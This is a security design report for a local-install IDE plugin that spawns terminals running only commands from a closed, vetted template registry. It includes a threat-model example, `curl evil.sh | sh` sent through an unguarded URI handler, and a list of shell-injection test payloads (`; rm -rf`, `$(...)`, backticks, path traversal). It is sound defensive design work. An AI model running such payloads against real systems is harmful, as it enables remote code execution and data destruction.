# Practice ↔ IDE Integration Plane — Feasibility & Safe-Design Report

**Date:** 2026-06-25
**Author session:** Panther hunts Reverie (`7e4510`)
**Status:** Report only — no code written, no plugin built, no extension installed.
**Scope of this report:** the design and security argument for a new
**Practice-owned IDE plugin** (`practice-ide-plugin`), local-install only,
that gives the Practice a *governed* way to cause effects inside any VS
Code-family IDE — and the agent-tools commands that drive it. The plane's
**first and only committed capability** is: *create a visible interactive
terminal and run one strictly-vetted, template-built command in it.*

**Lineage:** this supersedes the earlier framing of this artefact (a Cursor-only
terminal-spawn helper, then a VS Code-family terminal spawner). Two owner
reframings moved it: (1) the mechanism is not Cursor-specific; (2) the real thing
being built is **Practice↔IDE integration**, of which terminal-spawn is the
deliberately minimal first instance. The terminal-spawn analysis is retained
below as the first capability and as the security worked-example.

---

## 1. Bottom line (verdict)

Build it, as a Practice-owned, local-install-only IDE plugin plus two agent-tools
commands — but treat it as a **capability plane with exactly one shipped verb**,
not as a terminal feature. The design is sound *if and only if* the safety
property is structural, and the structural property is this:

> **The blast radius of the entire plane is bounded, by construction, to the
> closed set of in-repo, adversarially-vetted templates. No caller — local or
> otherwise — can ever cause execution outside that set.**

Three decisions make that property real, and each inverts the anti-pattern of
the third-party `vscode-commands-executor` (analysed in §4):

1. **No URI handler.** The plugin is driven by a workspace-scoped file-drop
   request, not a globally-reachable `vscode://` URL. There is no remote origin.
2. **No command strings, ever.** A request carries `{ templateId, params }` —
   never a command, never free text. The plugin owns a **closed template
   registry**; the caller selects an id and supplies typed, schema-validated
   parameters.
3. **No shell injection surface.** Templates build an **argv array**, not a
   shell string. Parameters are typed (enums, workspace-relative paths) and
   either flow through a no-shell launch (`createTerminal({ shellPath,
   shellArgs })`) or, if the command must be visible in an interactive shell,
   pass a per-template adversarial injection corpus before the template is
   admitted to the registry.

The headline insight from the reasoning rounds: **"templates" are not the safety
property — they are the delivery mechanism for it.** The property is "the
executable set is closed and no caller string reaches a shell". A loosely-shaped
template (`git <subcommand> <args>`) reintroduces arbitrary execution; a
well-shaped one (fixed executable + typed/enumerated params + argv assembly) does
not. The security work is therefore *per-template parameter→shell flow analysis*,
not a one-time "we use templates" assertion.

Both halves — the plugin and the agent-tools commands — are **Practice
substance** (PDR-035): the *capability concept* is portable doctrine; the
TypeScript plugin and CLI are this repo's host phenotype (ADR-165).

**Hard prerequisite:** no implementation begins until the official VS Code and
Cursor extension documentation is deeply read — see *Required reading before any
implementation* below. The security model in §5–§6 depends on correctly
understanding the extension-host capability surface (the extension host has full
Node.js access; terminal creation, file watching, and URI handling each have
specific contracts) and on the packaging / local-install path that honours the
local-install-only constraint.

---

## Required reading before any implementation (hard prerequisite)

This work does not start as code. Before any line of the plugin or the
`practice-ide` agent-tools commands is written, the following official
documentation must be **deeply read** — not skimmed — because the safety
properties in §5–§6 are claims *about these APIs* and are only as sound as our
understanding of them. The reading is a gate, not a reference appendix.

**VS Code Extension API (authoritative):**

- [Extension API overview](https://code.visualstudio.com/api) — the surface and its boundaries
- [Your First Extension](https://code.visualstudio.com/api/get-started/your-first-extension) — the build/run/debug loop
- [Extension Anatomy](https://code.visualstudio.com/api/get-started/extension-anatomy) — activation, `package.json`, the extension host
- [Extension Manifest](https://code.visualstudio.com/api/references/extension-manifest) — `contributes`, capabilities, the minimal manifest we want
- [Activation Events](https://code.visualstudio.com/api/references/activation-events) — activate narrowly (workspace-folder presence), not `*`
- [Contribution Points](https://code.visualstudio.com/api/references/contribution-points) — what the plugin must and must not contribute
- [VS Code API reference](https://code.visualstudio.com/api/references/vscode-api) — read `window.createTerminal` (incl. `shellPath`/`shellArgs`), `workspace.createFileSystemWatcher`, and `window.registerUriHandler` closely; these are the exact primitives the design turns on
- [Terminal extension guide](https://code.visualstudio.com/api/extension-guides/terminal) — terminal creation, the no-shell launch, and `sendText` semantics (the §6.1 tension)
- [Publishing & packaging extensions](https://code.visualstudio.com/api/working-with-extensions/publishing-extension) — packaging to VSIX and local install without a marketplace
- [`vsce` packaging tool](https://github.com/microsoft/vsce) — `vsce package` produces the local `.vsix`

**Cursor (authoritative):**

- [Cursor — Extensions](https://cursor.com/help/customization/extensions) — Cursor uses the Open VSX registry behind its own marketplace proxy (`marketplace.cursorapi.com`) with automated malware/supply-chain analysis; supports local VSIX install via `cursor --install-extension <file>.vsix`; and offers enterprise `AllowedExtensions` / Open VSX signature-verification controls. All three facts bear on the local-install-only posture and on how the plugin is distributed to teammates.

The read must answer, before design freezes: what exactly the extension host can
do (full Node access confirms why the capability registry, not the transport, is
the binding control); the precise `createTerminal` contract for a no-shell launch
vs `sendText`; the `FileSystemWatcher` scoping and event guarantees; and the
packaging/local-install commands for both VS Code and Cursor. Findings that
contradict any assumption in §5–§6 supersede this report and force a revision
before build.

## 2. Vision vs committed scope (hold both, separately)

The owner's brief names a wide purpose ("integrating the Practice with the IDE")
and a narrow first step ("just the one command"). Conflating them is the failure
mode in both directions: under-design the seam and the plane can't grow safely;
over-build the plane and we ship an unvetted attack surface. The discipline:

- **Design the seam wide.** Transport, authorisation, capability registry, audit,
  and kill-switch are designed once, as the plane.
- **Ship the surface narrow.** Exactly one template is admitted to the registry
  and one agent-tools request path is wired. The registry is a closed map that
  *happens to have one entry*.

| Layer | Vision (the plane) | Committed scope (this build) |
| --- | --- | --- |
| Capabilities | terminal, diff view, file focus, panel surfacing, status display… | **one**: spawn terminal + run one vetted template |
| Templates | a growing, individually-vetted registry | **one** vetted template (zero or enumerated params) |
| Transport | file-drop request bus | file-drop request bus (built) |
| agent-tools | `practice-ide` topic with several actions | `install` + `request` (built) |

Everything past the committed column is **named, not built** — it routes to a
plan, not to code.

---

## 3. The problem, framed (not the solution)

- **Gap:** the Practice can read and write files and emit text, but it cannot
  *act* in the IDE the owner is actually looking at. There is no governed channel
  for Practice-side tooling to cause IDE-side effects.
- **Who it serves:** the owner and agents who want Practice workflows
  (multi-terminal orchestration, surfacing collaboration/claims state, driving
  review panes) to manifest as real, visible, interactive IDE artefacts — not
  just files on disk.
- **The clarified shape of the value:** terminals (and later surfaces) must be
  **IDE-native, individually visible, and interactive** — opened on demand from a
  running terminal, with a chosen name and cwd. This is exactly what
  `vscode.window.createTerminal` produces and what no multiplexer or CLI flag
  delivers (see §9).
- **Mechanism of the gap:** IDE effects live only on the extension host; the
  Practice has no extension presence. agent-tools runs *outside* the host (in a
  terminal), so it cannot call the IDE API directly. A plugin is the necessary
  IDE-side half.
- **Constraints (owner, load-bearing):** local-install only, never published to a
  marketplace; high security and high safety; **no arbitrary code or command** —
  only a selection built from templates; templates **adversarially analysed for
  vulnerabilities** before admission; integrates with agent-tools; both halves
  are Practice.
- **Success looks like:** an agent-tools command opens a visible interactive
  terminal and runs one vetted templated command in whichever VS Code-family IDE
  is running; the worst case an attacker (or a buggy caller) can achieve is
  bounded by the vetted template set; every execution is auditable; and the
  plane can grow one vetted template at a time without re-opening the security
  argument.

---

## 4. The anti-pattern we are inverting (`vscode-commands-executor`)

The vendored third-party extension
([`.agent/reference-local/repos/vscode-commands-executor`](../reference-local/repos/vscode-commands-executor),
313 lines, MIT) is the cautionary baseline. Its `runCommands` verb does
`vscode.commands.executeCommand(anyId, anyArgs)` from a `vscode://` URI handler
that executes **silently, with no confirmation and no origin check**
([`src/UriHandler.ts`](../reference-local/repos/vscode-commands-executor/src/UriHandler.ts),
[`src/commands/VSCodeCommand.ts`](../reference-local/repos/vscode-commands-executor/src/commands/VSCodeCommand.ts)).

Why this is the exact inverse of what we want:

- **Globally reachable.** `vscode://`/`cursor://`/per-fork schemes are OS-level;
  any web page can fire one. Porting it to a fork re-creates the surface under
  that fork's scheme.
- **Unbounded capability.** Arbitrary command id + args means
  `workbench.action.terminal.sendSequence` with `{ "text": "curl evil.sh | sh\n" }`
  — drive-by code execution, for as long as it is installed.

Its danger is **not provenance** (third-party, unmaintained). It is
**architecture**: generality + no auth + no confirmation + global reachability.
Our plane keeps the one useful idea (an extension that can act on a request) and
removes every dangerous property: no URI surface, no arbitrary command, bounded
capability set.

---

## 5. Architecture — three layers, each independently sound

The security argument is layered so that **even if an outer layer is fully
compromised, the inner layer caps the damage.** This is the defence-in-depth that
makes "high safety" structural rather than procedural.

### 5.1 Transport — workspace file-drop bus (no URI handler)

agent-tools writes a request file; the plugin watches for it.

```text
.agent/state/practice-ide-requests/<uuid>.json
```

```jsonc
{
  "templateId": "spawn-terminal-run-gate", // must exist in the closed registry
  "params": {},                              // validated against the template schema
  "requestedBy": "agent-tools",              // provenance, for the audit record
  "requestedAt": "2026-06-25T11:00:00Z"
}
```

- **Plugin:** a `FileSystemWatcher` scoped to the workspace folder. On a new
  file: validate → execute → write an audit record → delete the request.
- **No `vscode://` handler is registered at all.** There is nothing a web page or
  remote origin can fire. The only way to enqueue is to write a file inside the
  repo.
- **IDE-agnostic:** pure extension API (`createTerminal` + `FileSystemWatcher`),
  no fork-specific URL scheme. One build serves VS Code, Cursor, VSCodium,
  Windsurf.

### 5.2 Authorisation — local filesystem write (already-trusted), bounded by §5.3

The authorisation boundary is "can write into the repo working tree", which is an
already-trusted boundary. This is deliberately *not* the security guarantee — a
malicious local process or a compromised dev dependency also has that access. The
guarantee is that authorisation only grants the ability to *select a vetted
template*, never to execute anything outside the registry. §5.3 is what makes a
compromised §5.2 survivable.

### 5.3 Capability — closed template registry (the actual guarantee)

The registry is an in-repo, closed map. A template is a typed argv builder, not a
string:

```ts
// closed registry — adding an entry is a reviewed, adversarially-analysed change
const REGISTRY = {
  "spawn-terminal-run-gate": {
    executable: "pnpm",                 // from a fixed executable allowlist
    argv: ["agent-tools:gates"],        // fixed argv; zero free parameters
    cwd: "<workspace-root>",            // fixed
    params: {},                         // none
  },
  "spawn-terminal-in-package": {
    executable: "pnpm",
    argvTemplate: ["--filter", "{packageName}", "test"],
    params: {
      packageName: {
        type: "enum",
        // allowed set is generated from the live pnpm workspace, not free text
        allowedFrom: "pnpm-workspace-packages",
      },
    },
  },
} as const;
```

Rules that make the capability layer the binding guarantee:

1. **`templateId` must be a key of the closed registry.** Unknown id → rejected.
2. **No caller-supplied command or executable, ever.** The executable comes from
   a fixed allowlist inside the template; the caller cannot name one.
3. **Parameters are strictly typed and validated** against the template's schema:
   enums (membership-checked against a generated set), workspace-relative paths
   (resolved, `..`/absolute rejected). Reject-unknown on extra params
   (`closed-shape-design-optionality`).
4. **The command is assembled as an argv array** and run via a no-shell launch
   (`createTerminal({ shellPath, shellArgs })`) wherever possible, so no shell
   parsing step exists. See §6 for the interactive-shell exception.
5. **Templates are versioned/hash-identified;** the audit record names the exact
   template version that ran.

Because of layer 5.3, the worst case for a totally-compromised transport/auth is
"an attacker can run any *vetted* template with *valid* params" — bounded,
auditable, and chosen by us. That is the high-safety property.

---

## 6. Security & safety model

### 6.1 The terminal-is-a-shell tension, resolved

The owner wants the command *in a visible interactive terminal*. A terminal is a
shell, and `terminal.sendText(str)` runs `str` through that shell — the classic
injection surface. Two resolutions, in preference order:

1. **No-shell launch (preferred for execution templates).** Create the terminal
   with the vetted executable as its process:
   `createTerminal({ name, cwd, shellPath: executable, shellArgs: argv })`. The
   argv array is passed to the process directly; **there is no shell to inject
   into.** The terminal is still visible and its output interactive.
2. **Assembled-line into an interactive shell (only if the owner needs an
   editable shell line).** The plugin assembles the line from the template +
   validated params, shell-quotes every token with a strict quoter, and only then
   `sendText`s it. A template using this path **must pass a per-template
   injection corpus** (see §6.2) before admission. Caller strings never take this
   path; only template-assembled lines do.

### 6.2 Per-template adversarial analysis (admission gate)

A template enters the registry only after an adversarial pass whose object is
narrow and concrete: **can any declared parameter reach a shell or process
position in a way that changes the command's meaning?** The corpus probes each
param with injection payloads (`; rm -rf`, `$(...)`, backticks, `&&`, newlines,
path traversal, absolute paths, unicode lookalikes, over-long inputs). The pass
is a **comprehensive security review run by a variety of review agents** — not a
single reviewer — chosen to bring disjoint lenses (injection, path/escaping,
extension-host capability misuse, supply-chain) so the review does not collapse
to one model's blind spots; every agent's verdict is recorded against the
template version. A template that cannot be shown injection-safe by the full
review is not admitted. This operationalises `governance-claim-needs-a-scanner`:
the safety claim has a mechanical corpus plus multi-agent adversarial review, not
vigilance.

### 6.3 Defence-in-depth controls (both paths)

- **Audit log.** Every executed request appends an immutable record (template id
  + version/hash, validated params, requestedBy, timestamp, result) under
  `.agent/state/`.
- **Kill switch.** A single setting/flag disables the watcher; the plugin is
  inert by default until explicitly enabled.
- **Concurrency / rate cap.** Refuse beyond N spawned terminals per window
  (`no-unbounded-host-load`); cap requests/interval.
- **Visible.** A status-bar item and notification on every execution; nothing
  silent.
- **No auto-run of caller text.** There is no `seedText` free-string field at all
  — the prior design's optional seed is removed; only template-assembled commands
  run.

### 6.4 Falsifier (name it before building)

The safety claim is false the moment **any admitted template has a parameter that
flows into a shell or process-argument position where its meaning can be changed
by metacharacters or path traversal.** The §6.2 corpus is precisely the test for
that falsifier, run per template, per version.

---

## 7. The first capability (committed scope)

End to end, the one thing built:

1. `agent-tools practice-ide request --template <id> [--param k=v …]` validates
   the id against the closed registry and the params against the template schema,
   then writes `.agent/state/practice-ide-requests/<uuid>.json`.
2. The plugin's watcher picks it up, re-validates against its own copy of the
   registry (the CLI's validation is a convenience, not the trust boundary — the
   plugin is authoritative), spawns a named terminal at the resolved cwd via the
   no-shell launch, writes the audit record, deletes the request.
3. A visible, interactive terminal appears running the vetted command.

**First template:** the safest first entry is **zero-parameter** (e.g.
`spawn-terminal-run-gate` running a fixed `pnpm agent-tools:*` command), so the
first increment proves the whole plane with *no* injection surface at all. A
parameterised template (e.g. enumerated package name) is the natural second, once
the corpus harness exists. Exact first command is an owner decision (§10).

---

## 8. agent-tools integration

A new `practice-ide` topic on the unified `agent-tools <topic> <action>`
entrypoint, honouring the workspace's strict `--help` norms (full usage on
`--help` and on any invalid/missing/enum-violating flag, at every depth):

- **`practice-ide install`** — build and locally install the plugin into the
  detected IDE (unpacked/dev-extension or local `.vsix`), never from a
  marketplace. Detects which VS Code-family IDE is running.
- **`practice-ide request --template <id> [--param k=v …]`** — the committed
  request path (§7). Enum-validates `--template` against the registry and lists
  allowed ids on failure (CLI norm).
- **`practice-ide status`** — report whether the plugin is installed/enabled and
  show the recent audit tail.
- **Graceful degradation:** if the plugin is absent or disabled (no heartbeat,
  request unconsumed within a timeout), fail loudly with a one-line remediation
  (`fail-fast-with-helpful-errors`), never hang.
- **Boundary:** agent-tools never calls the IDE API (wrong process); it only
  enqueues validated requests. The plugin is authoritative for validation and is
  auditable in isolation.

The plugin lives **in-repo** as its own workspace (`practice-ide-plugin/`
alongside `agent-tools/`), versioned and built by the same gates — not a
marketplace dependency. One build serves every fork.

---

## 9. Practice positioning

- **Why this is Practice substance.** Per PDR-035, agent-work capabilities belong
  to the Practice. "The Practice can act in the IDE under a bounded, audited
  capability set" is a portable *concept* (PDR-shaped). The TypeScript plugin, the
  `practice-ide` agent-tools topic, and the file-drop bus are this repo's host
  *phenotype* (ADR-shaped, per the ADR-165 boundary). The report names the split
  because the owner stated both halves are Practice: the concept travels; the
  implementation is local.
- **Why local-install only.** A plugin that can spawn terminals and run commands
  is a privileged bridge. Keeping it out of any marketplace removes the
  supply-chain and silent-update surface, keeps the audited template registry
  in-repo and reviewed by our gates, and keeps the trust root inside the
  repository the Practice already governs.
- **Graduation path.** If/when the capability proves out, the portable concept is
  a candidate PDR and the host realisation a candidate ADR; the template-admission
  adversarial pass is a candidate reviewer-matrix entry.

---

## 10. Alternatives considered

Judged against the fixed requirement: *visible + interactive + native +
on-demand*, **and** *no arbitrary execution / bounded capability set*.

| Option | Meets requirement? | Trust posture | Verdict |
| --- | --- | --- | --- |
| **Practice IDE plugin, file-drop + closed template registry (this report)** | Yes | No URI surface; blast radius bounded to vetted templates by construction | **Recommended** |
| Port `vscode-commands-executor` as-is | Yes (functionally) | Generic, unauth, global RCE surface per fork | Rejected (the anti-pattern) |
| Narrow single-verb + nonce `vscode://` handler | Yes | URI entry point remains; nonce-gated; still a globally-reachable surface to defend | Rejected for this plane — file-drop removes the surface entirely |
| External multiplexer (tmux/screen) | **No** — panes inside one terminal, not native visible tabs; own keybinding layer | Native, zero IDE surface | Downgraded by requirement; secondary fallback only, owner open to exploring |
| `tasks.json` compound task | Partial — visible native panels but fixed set, only on task-run, not on-demand with chosen params | Native | Useful for a fixed startup set, not the governed plane |
| OS keystroke injection (`osascript`) | Weakly — one terminal/invocation, focus-stealing, per-OS | No install; fragile | Manual one-off stopgap only |
| Do nothing | No | — | Only if the capability need is not yet real |

The multiplexer stays on the table only as a zero-surface fallback the owner
wishes to explore; it does not meet "individually visible, native, interactive".

---

## 11. Open decisions for the owner

These are the persisted open questions for this work; recommendations lead each
one. They are owned here (not only in chat) so the next session inherits them.

1. **First template.** Recommend a **zero-parameter** command (a fixed
   `pnpm agent-tools:*` invocation) so the first increment carries no injection
   surface. Which exact command?
2. **Interactive-shell line vs no-shell launch.** Recommend no-shell
   (`shellArgs`) for execution templates. Do you also want the command *visible
   and editable* in an interactive shell (which requires the §6.2 corpus even for
   the first template)?
3. **Workspace name & placement.** Proposed `practice-ide-plugin/` beside
   `agent-tools/`. Confirm.
4. **agent-tools surface.** Proposed `practice-ide` topic with `install` /
   `request` / `status`. Confirm names (the brief said "install practice plugin",
   "send request to practice plugin").
5. **Enabled-by-default vs kill-switch-default-off.** Recommend default-off; the
   watcher activates only on explicit enable.
6. **Who admits a template.** Recommend: a template enters the registry only via a
   reviewed change that runs the §6.2 corpus through a **comprehensive security
   review by a variety of review agents** (disjoint lenses — injection,
   path/escaping, extension-host capability misuse, supply-chain), each verdict
   recorded against the template version. Confirm this is the gate.
7. **Which agents constitute the "comprehensive" review.** The set is deliberately
   plural and not fixed to one reviewer. Which agents (and how many lenses) are
   the minimum bar for admission — and is the set itself reviewed/extended over
   time as new failure classes emerge?
8. **Documentation-read prerequisite.** Confirm the hard gate: the official VS
   Code and Cursor extension docs (see *Required reading before any
   implementation*) are deeply read, and any contradiction with §5–§6 forces a
   report revision, **before** any code is written.
9. **Multiplexer exploration** as a secondary, zero-surface route — keep open?
   (Non-blocking.)

---

## 12. Reasoning & metacognition trace

The owner asked for several rounds before the update. The load-bearing moves:

- **Round 1 — altitude shift (generative metacognition).** The narrow pointer
  ("open a terminal") sits under a wide purpose ("integrate the Practice with the
  IDE"). Cure: design the plane, ship one verb (§2). Guarded the opposite failure
  — over-building an unvetted plane — by making the registry a closed map with one
  entry.
- **Round 2 — the warrant, and the fluency trap.** "Templates make it safe"
  arrived too smoothly. Grounding it falsified it: a template is only safe if no
  parameter reaches a shell/process position unescaped and the executable set is
  closed. **Templates are the delivery mechanism, not the safety property** (§1,
  §6.4).
- **Round 3 — reversibility/stakes.** A standing local plugin that runs commands
  is near a one-way door and, as Practice substance, propagates. So the safety
  property must be structural and testable; the cheapest probe is one zero-param
  template end-to-end plus the injection corpus harness (§7, §6.2).
- **Round 4 — stress-test → the binding insight.** Three independent layers
  (transport / authorisation / capability); the capability layer binds even if the
  outer two are compromised, so **blast radius is bounded to the vetted template
  set by construction** (§5). This, not "we use templates", is the high-safety
  claim, and it inverts every dangerous property of the third-party extension
  (§4).

---

## 13. Evidence ledger

- `cursor --help` (Cursor 3.8.11, a VS Code CLI fork): no command-execution flag;
  subcommands `tunnel`, `agent`. Confirms agent-tools cannot reach the IDE
  terminal API from the CLI; an extension is required. The gap is upstream of all
  forks ([microsoft/vscode#184088](https://github.com/microsoft/vscode/issues/184088)).
- Third-party source read in full under
  [`.agent/reference-local/repos/vscode-commands-executor`](../reference-local/repos/vscode-commands-executor):
  `runCommands` runs arbitrary command id + args; `handleUri` executes with no
  confirmation and no origin check; activation `onStartupFinished`. This is the
  anti-pattern (§4).
- Cross-IDE generality: `vscode.window.createTerminal`, `FileSystemWatcher`, and
  the `workbench.action.terminal.*` commands are part of the stable `vscode`
  extension API shared by all VS Code-family forks; one plugin build serves VS
  Code, Cursor, VSCodium, Windsurf with no per-fork code (the file-drop transport
  uses no URL scheme).
- Practice positioning verified against
  [`.agent/practice-index.md`](../practice-index.md) and
  [`agent-tools/README.md`](../../agent-tools/README.md): agent-tools is host-local
  Practice implementation with a unified `<topic> <action>` entrypoint and strict
  `--help` norms; PDR-035 makes agent-work capabilities Practice substance; ADR-165
  is the host phenotype boundary.
- Template admission uses a **comprehensive security review by a variety of review
  agents** (disjoint lenses), not a single reviewer, composed with the §6.2
  injection corpus.
- Official documentation to be deeply read before implementation (URLs verified
  2026-06-25): VS Code — [Extension API](https://code.visualstudio.com/api),
  [Your First Extension](https://code.visualstudio.com/api/get-started/your-first-extension),
  [Extension Anatomy](https://code.visualstudio.com/api/get-started/extension-anatomy),
  [Extension Manifest](https://code.visualstudio.com/api/references/extension-manifest),
  [Activation Events](https://code.visualstudio.com/api/references/activation-events),
  [Contribution Points](https://code.visualstudio.com/api/references/contribution-points),
  [VS Code API reference](https://code.visualstudio.com/api/references/vscode-api),
  [Terminal guide](https://code.visualstudio.com/api/extension-guides/terminal),
  [Publishing & packaging](https://code.visualstudio.com/api/working-with-extensions/publishing-extension),
  [`vsce`](https://github.com/microsoft/vsce); Cursor —
  [Extensions](https://cursor.com/help/customization/extensions) (Open VSX +
  marketplace proxy with malware/supply-chain analysis; `cursor --install-extension`
  for local VSIX; enterprise `AllowedExtensions` / signature verification).
